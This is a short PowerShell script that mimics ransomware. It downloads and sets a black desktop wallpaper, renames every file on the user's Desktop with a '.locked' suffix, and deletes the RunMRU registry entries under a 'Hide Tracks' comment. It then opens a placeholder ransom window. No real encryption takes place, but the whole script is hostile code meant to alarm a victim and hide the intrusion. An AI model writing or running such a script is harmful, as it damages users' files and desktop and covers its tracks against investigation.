#Changes Background  
$url = "https://www.solidbackgrounds.com/images/3840x2160/3840x2160-black-solid-color-background.jpg"


Invoke-WebRequest $url -OutFile C:\Windows\Temp\black.jpg


$setwallpapersrc = @"
using System.Runtime.InteropServices;

public class Wallpaper
{
  public const int SetDesktopWallpaper = 20;
  public const int UpdateIniFile = 0x01;
  public const int SendWinIniChange = 0x02;
  [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
  private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
  public static void SetWallpaper(string path)
  {
    SystemParametersInfo(SetDesktopWallpaper, 0, path, UpdateIniFile | SendWinIniChange);
  }
}
"@
Add-Type -TypeDefinition $setwallpapersrc

[Wallpaper]::SetWallpaper("C:\Windows\Temp\black.jpg")

# Rename Files
Get-ChildItem $HOME\Desktop\* | Rename-Item -NewName {$_.name + ".locked"}

# Hide Tracks
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue


# Füge die Windows Forms Assembly hinzu
Add-Type -AssemblyName 'System.Windows.Forms'

# Erstelle ein neues Formular-Objekt
$FormObject = [System.Windows.Forms.Form]
$RansomForm = New-Object $FormObject

# Setze die Größe des Formulars
$RansomForm.ClientSize = '700,400'

# Erstelle ein Label und füge es dem Formular hinzu
$LabelObject = [System.Windows.Forms.Label]
$Label = New-Object $LabelObject
$Label.Text = 'Some Text'
$Label.AutoSize = $true
$Label.Location = '200,150'

# Füge das Label dem Formular hinzu
$RansomForm.Controls.Add($Label)

# Zeige das Formular an
$RansomForm.ShowDialog()